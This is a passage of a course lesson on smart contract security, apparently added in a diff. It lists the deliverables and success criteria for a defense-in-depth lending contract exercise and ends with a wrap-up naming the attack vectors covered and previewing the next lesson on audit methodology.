+- [ ] Time delays between borrows (cooldown period)
+- [ ] Emergency pause mechanism (PAUSER_ROLE)
+- [ ] Comprehensive events for monitoring
+- [ ] Role-based access control (from role-based-access-control)
+- [ ] Comprehensive test suite (from security-testing-audit-preparation)
+
+**Deliverables:**
+1. Complete contract code (Solidity 0.8+)
+2. Test suite demonstrating defenses work (Hardhat or Foundry)
+3. Submit to AI Reviewer and achieve passing score (no CRITICAL findings)
+4. Document threat model: What attacks does each defense prevent?
+5. Write attack contracts that fail against your defenses
+
+**Success criteria:**
+- AI Reviewer shows 0 CRITICAL findings
+- AI Reviewer shows 0 HIGH findings
+- Test coverage > 95%
+- Attack contracts (flash loan, oracle manipulation, reentrancy) all revert
+- Documentation explains each defense layer
+
+This exercise combines all attack vectors from the lesson into a single comprehensive implementation. It demonstrates your mastery of advanced security patterns and defense-in-depth architecture.
+
+## Wrap-up and next steps
+
+You've mastered advanced attack vectors: flash loan exploitation and TWAP defenses, oracle manipulation and multi-oracle aggregation, cross-contract reentrancy, storage collision prevention, signature replay and EIP-712, frontrunning and commit-reveal patterns.
+
+**Key skills mastered:**
+- Modeling economic attacks (not just code bugs)
+- Implementing defense-in-depth (layered security)
+- Preventing oracle manipulation with TWAP + sanity checks
+- Securing cross-contract interactions
+- Using EIP-712 for replay-resistant signatures
+
+**Next lesson (smart-contract-audit-methodology)**: Smart Contract Audit Methodology—professional audit processes, preparing documentation for auditors, understanding audit firm selection, remediation procedures, and bug bounty program setup. You'll combine all attack vectors from this lesson into comprehensive audit preparation.
+
+**Practice challenge**: Build a lending protocol with full defenses: Chainlink + TWAP oracles, flash loan protection, cross-contract reentrancy guards, and slippage protection. Then attempt to exploit it using flash loans, oracle manipulation, and cross-contract attacks. Document every defense layer and why it's necessary.
+
+Advanced attacks require advanced defenses. Layer your security controls and model economic incentives—that's how billion-dollar protocols survive.
+
+
